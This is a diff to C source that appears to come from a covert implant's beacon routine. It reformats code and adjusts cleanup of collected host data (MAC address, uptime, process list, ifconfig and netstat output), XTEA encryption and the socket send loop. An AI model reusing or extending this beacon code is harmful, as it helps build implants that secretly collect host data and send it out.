-		DLX(4, printf( "\tReceived %d bytes\n", retval));
+		if (retval == 0) {
+			DLX(6, printf("\tPeer closed connection\n"));	// Not sure if this should be success or failure
+			break;
+		}
+		DLX(6, printf("\tReceived %d bytes\n", retval));
+		DPB(7, "Received buffer: ", (const unsigned char *)recv_buf, retval);
+		DPB(7, "Received data: ", (const unsigned char *)(recv_buf + sizeof(SSL_HDR)), retval - (sizeof(SSL_HDR) ));
 
-		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
-		DLX(4, printf("\tACKed bytes: %d\n", recv_sz));
+		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR)));
+		DLX(6, printf("\tACKed bytes: %d\n", recv_sz));
 		bytes_sent += recv_sz;
-		DLX(4, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size-bytes_sent));
+		DLX(6, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size - bytes_sent));
 	} while (bytes_sent < encrypt_size);
 
 	retval = SUCCESS;
 	DLX(4, printf("BEACON SENT cleaning up\n"));
 
-EXIT:
-	//cleanup
+  EXIT:	// cleanup
 
 	if (beacon_io)
-		if (beacon_io->ssl->major_ver >= 1 ) {
+		if (beacon_io->ssl->major_ver >= 1) {
 			crypt_close_notify(beacon_io);
 			crypt_cleanup(beacon_io);
 		}
 
-	if(mac_data != NULL)
-	{
-		free(mac_data);
-	}
+	Free(mac_data);
+	Free(uptime_data);
+	Free(next_beacon_data);
+	Free(proc_list_data);
+	Free(ipconfig_data);
+	Free(netstat_rn_data);
+	Free(netstat_an_data);
+	Free(enc_buf);
+	Free(packet);
+	Free(compressed_packet);
 
-	if(uptime_data != NULL)
-	{
-		free(uptime_data);
-	}
-
-	if(next_beacon_data != NULL)
-	{
-		free(next_beacon_data);
-	}
-
-	if(proc_list_data != NULL)
-	{
-		release_process_list(proc_list_data);
-	}
-
-	if(ipconfig_data != NULL)
-	{
-		release_ifconfig(ipconfig_data);
-	}
-
-	if(netstat_rn_data != NULL)
-	{
-		release_netstat_rn(netstat_rn_data);
-	}
-
-	if(netstat_an_data != NULL)
-	{
-		release_netstat_an(netstat_an_data);
-	}
-
-	if(enc_buf != NULL)
-	{
-		free(enc_buf);
-	}
-
-	if(packet != NULL)
-	{
-		free(packet);
-	}
-
-	if(compressed_packet != NULL)
-	{
-		release_compressed_packet(compressed_packet);
-	}
-
-	if ( sock > 0 ) net_close( sock );
+	if (sock > 0)
+		net_close(sock);
 
 	return retval;
 }
 
 //******************************************************************
 
-void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigned char* key)
+void encrypt_data(unsigned char *src, int src_size, unsigned char *dest, unsigned char *key)
 {
 	xtea_context xtea;
-	int i,x;
-	unsigned char* src_ptr;
-	unsigned char* dest_ptr;
+	int i, x;
+	unsigned char *src_ptr;
+	unsigned char *dest_ptr;
 	unsigned char enc[8];
 	unsigned char buf[8];
-	
+
 	//initialize the xtea encryption context
-	xtea_setup(&xtea,key);
+	xtea_setup(&xtea, key);
 
 	i = 0;
-	
-	while(i < src_size)
-	{
+
+	while (i < src_size) {
 		src_ptr = src + i;
-		dest_ptr = dest +i;
-		if( (src_size - i) < 8)
-		{
-			for(x = 0; x < (src_size - i); ++x)
-			{
+		dest_ptr = dest + i;
+		if ((src_size - i) < 8) {
+			for (x = 0; x < (src_size - i); ++x) {
 				buf[x] = src_ptr[x];
 			}
-			memset(buf + (src_size - i), 0, (8 - (src_size-i)) );
-		}
-		else
-		{
-			for(x = 0; x < 8; ++x)
-			{
+			memset(buf + (src_size - i), 0, (8 - (src_size - i)));
+		} else {
+			for (x = 0; x < 8; ++x) {
 				buf[x] = src_ptr[x];
 			}
 		}
 
-		xtea_crypt_ecb(&xtea,XTEA_ENCRYPT,buf,enc);
+		xtea_crypt_ecb(&xtea, XTEA_ENCRYPT, buf, enc);
 
-		memcpy(dest_ptr,enc,8);
+		memcpy(dest_ptr, enc, 8);
 		i += 8;
 	}
 }
 
 
 //******************************************************************
-int get_printable_mac(unsigned char* dest, unsigned char* src)
+int get_printable_mac(unsigned char *dest, unsigned char *src)
 {
 	char buffer[18];
-	memset(buffer,0,18);
+	memset(buffer, 0, 18);
 
-	sprintf(buffer,"%.2x-%.2x-%.2x-%.2x-%.2x-%.2x",
-		src[0],
-		src[1],
-		src[2],
-		src[3],
-		src[4],
-		src[5]);
+	sprintf(buffer, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x", src[0], src[1], src[2], src[3], src[4], src[5]);
 
-	memcpy(dest,buffer,18);
+	memcpy(dest, buffer, 18);
 	return 0;
 }
 
 //******************************************************************
-void extract_key(unsigned char* buf, unsigned char* key)
+void extract_key(unsigned char *buf, unsigned char *key)
 {
 	int offset;
 
